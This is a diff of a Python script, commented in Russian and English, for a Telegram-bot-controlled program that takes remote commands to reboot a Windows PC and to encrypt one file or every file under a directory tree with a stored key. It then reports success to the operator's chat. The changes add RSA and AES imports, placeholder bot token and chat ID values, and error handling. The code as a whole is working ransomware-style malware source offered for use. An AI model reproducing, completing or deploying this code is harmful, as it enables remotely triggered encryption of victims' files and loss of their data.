@@ -1,23 +1,26 @@
-from os import system, remove
+from Cryptodome.PublicKey import RSA
+from Cryptodome.Random import get_random_bytes
+from Cryptodome.Cipher import AES, PKCS1_OAEP
+from os import path, remove, listdir, system
 import telebot
 from cryptography.fernet import Fernet
 
-input_file = 'ss.rar'  # Файл для шифрования / Input file
-output_file = 'ss.encrypted'  # Файл который мы получаем на выходе / Output file
+input_file = ''   # Файл для шифрования / Input file
+output_file = 'file.encrypted'  # Файл который мы получаем на выходе / Output file
 
 key_file = open('key.key', 'rb')  # Открываем файл с ключём для чтения / Open file with key
 key = key_file.read()  # Читаем содержимое файла с ключём / Read content of key file
-key_file.close()  # Зыкрываем файл с ключём / Close file with key
+key_file.close()  # Зыкрываем файл с ключём/ Close file with key
 
 
-bot_token = ""  # Токен бота / Bot token
-chat_id = ""  # Наш айди / Our ID
+bot_token = "TOKEN"  # Токен бота / Bot token
+chat_id = "ID"  # Наш айди / Our ID
 bot = telebot.TeleBot(bot_token)
 
 bot.send_message(chat_id, "Bot started successfully!")
 
 
-# -----------------------------------------------------------------------------------------------------------------------
+# ---------------------------------------------------------------------------------------------------------------------
 
 
 # Initiate command /start
@@ -67,8 +70,8 @@ def restart(self):
     system("shutdown /r /t 1")  # Перезагрузка компьютера / Command to reboot our PC
 
 
-# Initiate command /encrypt
-@bot.message_handler(commands=["encrypting", "/encrypting"])
+# Initiate command /encryptingone
+@bot.message_handler(commands=["encryptingone", "/encryptingone"])
 def encrypt(self):
     try:
         with open(input_file, 'rb') as f:
@@ -85,10 +88,11 @@ def encrypt(self):
     except Exception as ex:  # Бот отправит нам сообщение с ошибкой / Bot will send us message with exception
         bot.send_message(chat_id, "Something went wrong!\n" + str(ex))
 
-        
+
 # Initiate command /encrypt
 @bot.message_handler(commands=["encryptingall", "/encryptingall"])
 def encrypt(self):
+    try:
         def crypt(file):
             f = open(file, "rb")
             data = f.read()
@@ -118,13 +122,14 @@ def encrypt(self):
                 else:
                     walk(path)
 
-        walk("Your directory must be here")
-        
-        
-# -----------------------------------------------------------------------------------------------------------------------
+        walk("your_directory")
+        bot.send_message(chat_id, "Successfully encrypted")
+    except Exception as ex:  # Бот отправит нам сообщение с ошибкой / Bot will send us message with exception
+        bot.send_message(chat_id, "Something went wrong!\n" + str(ex))
+# ---------------------------------------------------------------------------------------------------------------------
 
 
 bot.polling()
 
 
-# -----------------------------------------------------------------------------------------------------------------------
+# ---------------------------------------------------------------------------------------------------------------------
